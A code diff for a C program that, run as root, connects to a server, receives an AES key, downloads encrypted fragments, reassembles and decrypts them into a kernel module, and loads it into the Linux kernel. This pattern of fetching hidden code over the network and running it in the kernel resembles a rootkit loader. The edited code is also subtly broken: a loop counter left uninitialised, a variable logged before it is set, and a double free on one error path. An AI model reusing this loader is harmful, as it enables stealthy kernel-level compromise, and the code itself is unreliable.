@@ -9,6 +9,8 @@
 #include "../include/log.h"
 #include "../include/sock.h"
 #include "../include/utils.h"
+
+/* server address */
 #define SERVER_IP "127.0.0.1"
 #define SERVER_PORT "8000"
 
@@ -98,33 +100,32 @@ static fraction_t *fetch_fractions(int sfd, int *fraction_count) {
   http_res_t http_fraction_res = {0};
 
   fraction_t *fractions = NULL;
-
-  int i, num_links;
+  char fraction_url[50];
+  int i, num_fractions;
   char *line;
 
-  if (http_get(sfd, "/", &http_fraction_res) != HTTP_SUCCESS) {
+  snprintf(fraction_url, 50, "http://%s:%s/stream", SERVER_IP, SERVER_PORT);
+
+  if (http_get(sfd, "/size", &http_fraction_res) != HTTP_SUCCESS) {
     log_error("Failed to retrieve fraction links");
   }
 
   log_debug("Retrieved fraction links");
 
-  num_links = count_lines(http_fraction_res.data) + 1;
+  num_fractions = atoi(http_fraction_res.data);
+  log_debug("Fetching %d fractions", num_fractions);
 
-  log_debug("%d links found", num_links);
-
-  fractions = calloc(num_links, sizeof(fraction_t));
+  fractions = calloc(num_fractions, sizeof(fraction_t));
   if (!fractions) {
     log_error("Failed to allocate memory for fractions");
     http_free(&http_fraction_res);
     return NULL;
   }
-
-  i = 0;
-  line = strtok(http_fraction_res.data, "\n");
-  while (line != NULL && i < num_links) {
+  
+  while (i < num_fractions) {
     log_debug("Downloading %s", line);
 
-    if (download_fraction(sfd, line, &fractions[i]) != 0) {
+    if (download_fraction(sfd, fraction_url, &fractions[i]) != 0) {
       log_error("Failed to download fraction");
 
       // we have to cleanup only until i because the other fractions have not
@@ -135,7 +136,6 @@ static fraction_t *fetch_fractions(int sfd, int *fraction_count) {
     }
 
     i++;
-    line = strtok(NULL, "\n");
   }
 
   http_free(&http_fraction_res);
@@ -155,58 +155,66 @@ int main(void) {
   uint8_t *module = NULL;
   ssize_t module_size;
 
+  /* We need root permissions to load LKMs */
   if (geteuid() != 0) {
     log_error("This program needs to be run as root!");
     exit(1);
   }
 
+  /* initialize PRNG and set logging level */
   init_random();
   log_set_level(LOG_DEBUG);
 
+  /* open a connection to the server */
   sfd = do_connect();
   if (sfd < 0) {
-    return EXIT_FAILURE;
+    goto cleanup;
   }
 
+  /* receive the AES key */
   aes_key = get_aes_key(sfd, &key_len);
   if (aes_key == NULL) {
-    close(sfd);
-    return EXIT_FAILURE;
+    goto cleanup;
   }
 
+  /* download and sort the fractions*/
   fractions = fetch_fractions(sfd, &fraction_count);
   if (fractions == NULL) {
-    free(aes_key);
-    close(sfd);
-    return EXIT_FAILURE;
+    goto cleanup;
   }
-
+  qsort(fractions, fraction_count, sizeof(fraction_t), compare_fractions);
   log_info("Downloaded fractions");
 
-  qsort(fractions, fraction_count, sizeof(fraction_t), compare_fractions);
-
+  /* decrypt the fractions and assemble the LKM */
   module = decrypt_lkm(fractions, fraction_count, &module_size, aes_key);
   if (module == NULL) {
     log_error("There was an error creating the module");
     cleanup_fraction_array(fractions, fraction_count);
-    free(aes_key);
-    close(sfd);
-    return EXIT_FAILURE;
+    goto cleanup;
   }
 
+  /* load the LKM in the kernel */
   if (load_lkm(module, module_size) < 0) {
     log_error("Error loading LKM");
-    free(module);
-    cleanup_fraction_array(fractions, fraction_count);
-    free(aes_key);
-    close(sfd);
-    return EXIT_FAILURE;
+    goto cleanup;
   }
 
-  free(module);
-  cleanup_fraction_array(fractions, fraction_count);
-  free(aes_key);
+  /* cleanup */
   close(sfd);
+  cleanup_fraction_array(fractions, fraction_count);
+  free(module);
+  free(aes_key);
 
-  return EXIT_SUCCESS;
+  return EXIT_SUCCESS; // hooray!!!
+
+  /* Encapsulate cleanup */
+cleanup:
+  if (sfd != -1) close(sfd);
+  if (fractions) cleanup_fraction_array(fractions, fraction_count);
+
+  free(module);
+  free(aes_key);
+
+  return EXIT_FAILURE;
+
 }
